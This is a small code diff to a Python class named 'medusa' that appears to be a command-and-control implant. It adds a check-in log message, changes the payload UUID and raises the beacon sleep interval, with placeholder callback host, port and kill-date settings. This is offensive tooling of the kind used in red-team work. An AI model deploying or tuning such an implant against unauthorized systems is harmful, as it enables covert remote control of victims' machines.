@@ -466,6 +466,7 @@ class medusa:
             #UUID = json.loads(response_data.replace(self.agent_config["PayloadUUID"],""))["id"]
             UUID = response_data["id"]
             self.agent_config["UUID"] = UUID
+            print(f"[+] Check-in successful. Assigned UUID: {UUID}")
             return True
         else: return False
 
@@ -1346,10 +1347,10 @@ class medusa:
             "Server": "callback_host",
             "Port": "callback_port",
             "PostURI": "/post_uri",
-            "PayloadUUID": "4f6e4343-8619-4f8b-b49f-de7ecdbab89a",
+            "PayloadUUID": "388d7f8f-e19c-4718-90bc-f3567cd2bd08",
             "UUID": "",
             "Headers": {},
-            "Sleep": 1,
+            "Sleep": 5,
             "Jitter": 0,
             "KillDate": "2027-01-08",
             "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
